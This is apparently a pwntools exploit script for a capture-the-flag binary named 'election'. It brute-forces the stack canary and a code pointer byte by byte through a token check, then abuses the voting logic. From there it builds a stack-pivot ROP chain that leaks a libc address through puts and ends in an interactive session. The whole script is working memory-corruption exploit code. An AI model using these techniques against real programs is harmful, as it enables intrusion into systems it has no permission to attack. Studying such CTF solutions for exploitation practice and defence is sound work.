from pwn import *

y = process("./election")

token = bytes('a'*0xb8, encoding="utf-8")
leak = b""
y.sendafter('>', '2')
y.sendafter('Register an anonymous token: ', token)
print (y.recvuntil('>').decode('utf-8'))

for i in range(16):
    for j in range(256):
        y.send('1')
        y.sendafter('Token: ', token + bytes([j]))
        tmp = y.recvuntil('>')
        #print(tmp)
        
        if 'Invalid' not in tmp.decode('utf-8'):
            token += bytes([j])
            leak += bytes([j])
            y.send('3')
            tmp = y.recvuntil('>')
            break
            
            
    print(i, leak)
    

# libc_csu_init = "0x"
# for i in range(10, -1, -2):
#     libc_csu_init += leak[8:14].hex()[i]
#     libc_csu_init += leak[8:14].hex()[i+1]

# libc_csu_init = int(libc_csu_init, 16)
# base = libc_csu_init - 0x1140
canary = u64(leak[:8])
libc_csu_init = u64(leak[8:16])
base = libc_csu_init - 0x1140

success("base --> %s" % hex(base))
print('libc_csu_init --> %s' % hex(libc_csu_init))
print('canary --> %s' % hex(canary))




for i in range(25):
    # register
    y.sendline('2')
    y.sendafter('Register an anonymous token: ', b"1234"+bytes(i))
    
    # login
    y.sendafter('>', '1')
    y.sendafter('Token: ', b"1234"+bytes(i))
    tmp = y.recvuntil('>')

    # vote
    for j in range(10):
        y.send('1')
        y.sendafter('Your choice [0~9]: ', '0')
        tmp = y.recvuntil('>')
        
    # logout
    y.send('3')
    
        
tmp = y.recvuntil('>')

b = ELF('./election')
rop = ROP(b)
b.address = base
PUTS = b.plt['puts']
LIBC_START_MAIN = b.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
LEAVE_RET = (rop.find_gadget(['leave', 'ret']))[0]
log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI+base))
log.info('leave ret: ' + hex(LEAVE_RET+base))
log.info('buf: ' + hex(base + 0x202160))


ropchain1 = b'c'*(0xe8) + p64(canary) + p64(base + 0x202160) + p64(LEAVE_RET+base)
ropchain2 = p64(0xdeadbeaf) + p64(POP_RDI+base) + p64(LIBC_START_MAIN) + p64(PUTS) + p64(base+0xffb)


# register
y.sendline('2')
y.sendafter('Register an anonymous token: ', ropchain2)

# login
y.sendafter('>', '1')
y.sendafter('Token: ', ropchain2)
tmp = y.recvuntil('>')


        


# say
y.send('2')
y.sendafter('To [0~9]: ', '0')
gdb.attach(y)
y.sendafter('Message: ', ropchain1)


y.sendafter('>', '3')
y.recvline()
libc = u64(y.recv(6) + b'\0\0') - 0x21ab0
print ("libc ==> ", hex(libc))

y.interactive()
#tmp = y.recvuntil('>')


